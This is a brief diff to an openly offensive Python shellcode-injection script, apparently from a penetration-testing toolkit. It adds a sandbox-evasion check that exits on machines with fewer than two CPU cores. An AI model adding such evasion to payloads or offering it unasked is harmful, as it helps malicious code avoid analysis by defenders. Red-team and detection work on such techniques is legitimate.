@@ -1,11 +1,17 @@
 #!/usr/bin/python
 import ctypes
 import sys
+import multiprocessing
+
 # Written by Dave Kennedy (ReL1K) @ TrustedSec.com
 # Injects shellcode into memory through Python and ctypes
 #
 # Initial awesome code and credit found here:
 # http://www.debasish.in/2012_04_01_archive.html 
+
+# added sandbox evasion here - most sandboxes use only 1 core
+if multiprocessing.cpu_count() < 2:
+        exit()
 
 # see if we specified shellcode
 try:
